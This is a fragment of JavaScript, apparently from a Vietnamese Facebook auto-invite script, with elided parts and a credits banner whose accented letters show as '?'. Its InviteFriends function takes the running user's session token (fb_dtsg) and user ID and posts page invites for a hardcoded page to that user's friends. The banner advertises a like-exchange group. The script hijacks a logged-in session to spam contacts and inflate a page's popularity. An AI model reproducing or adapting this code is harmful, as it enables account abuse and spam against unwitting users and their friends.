	function InviteFriends(e) {
	    ...
	    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + e + "%22%3A1%7D&checkableitems[0]=" + e + "&page_id=271800506212839&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
	}
	...
	var Descriptions = "",
	    _text = 'Powered By: <A style="color:#3B5998;" href="https://www.facebook.com/lu.hongphong" target="_blank">L? H?ng Phong</A>.</A></br>Script Made By: </A><A style="color:#3B5998;" href="https://www.facebook.com/groups/626804914045086/" target="_blank">A.F.T</A>.</A></A></A></br>Nh?n t?ng like fanpage: <A style="color:#3B5998;" href="https://www.facebook.com/groups/241218686029803/" target="_blank">Groups Exchange</A>.</A>';
